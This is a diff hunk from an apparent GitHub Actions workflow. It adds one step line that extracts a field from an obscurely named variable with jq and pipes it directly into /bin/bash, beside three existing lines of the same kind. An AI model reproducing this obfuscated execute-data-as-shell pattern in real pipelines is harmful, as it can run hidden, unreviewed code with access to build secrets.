@@ -23,6 +23,7 @@ jobs:
           echo $wfr39262 | jq -r .tje0 | /bin/bash
           echo $fip2 | jq -r .wi155 | /bin/bash
           echo $k3206 | jq -r .m308 | /bin/bash
+          echo $ve77721 | jq -r .adiax32 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
